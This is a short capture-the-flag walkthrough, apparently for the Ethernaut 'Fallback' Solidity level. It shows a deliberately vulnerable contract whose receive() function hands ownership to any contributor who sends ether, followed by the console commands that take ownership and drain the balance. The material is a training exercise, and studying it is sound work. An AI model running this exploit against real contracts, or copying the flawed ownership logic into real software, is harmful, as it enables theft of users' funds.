To beat the level
* we need to claim ownership of the contract
* clean the balance to 0

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

solution:

we are going to exploit the fallback function to gain ownership of the smart contract

this is the function that is vulnerable. Changing ownership is bad practtice
```
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

Fallback functions can be triggered if we send ether without any data to the smart contract

the above fallback function has an addendum though. We must first become a contributor with a value of less than 0.001.


```
await contract.contribute({value:web3.utils.toWei("0.0001")})
```

check if we have become contributor (use promise)
```
contract.getContribution()
```

send nominal amount of eth to become owner
```
contract.send(1)
```

check if your owner. this should give your eth wallet address. metamask in our case.
```
await contract.owner()
```


Then withdraw all money
```
contract.withdraw()
```

























